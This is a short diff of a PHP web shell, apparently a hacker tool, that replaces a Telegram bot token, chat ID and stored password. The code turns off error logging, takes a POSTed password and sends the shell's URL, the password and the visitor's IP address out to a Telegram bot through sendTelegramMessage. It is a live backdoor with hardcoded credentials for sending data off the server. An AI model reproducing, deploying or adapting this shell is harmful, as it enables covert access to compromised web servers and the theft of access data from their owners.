@@ -18,12 +18,12 @@ class Pukimak {
 @ini_set("log_errors", 0);
 @ini_set('error_log', 0);
 $password = isset($_POST['password']) ? $_POST['password'] : '';
-$botToken = '6849508672:AAGAmQvC7zibYi0qSLT4HM-9NScFo26Pa1Q';
-$chatId = '5575586332';
+$botToken = '7513781790:AAFC8T_sYrEM1sgIoqWzcBfjSE5Md5MrUYI';
+$chatId = '6116824863';
 $xPath = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
 $logMessage = "___Logger TOP99___ \n\n Shell nya =\n $xPath \n\n Password =\n $password \n\n IP Hacker Lain :\n [ " . $_SERVER['REMOTE_ADDR'] . " ]";
 sendTelegramMessage($botToken, $chatId, $logMessage);
-$password="c0e69812c177edcb1bc72fe0ee7d020e67cd72b8";
+$password="fa26dbf6a8f1fd767a634c3352e18ecb";
 $nm = "rootToku1337";
 function login() {
 echo '<html>
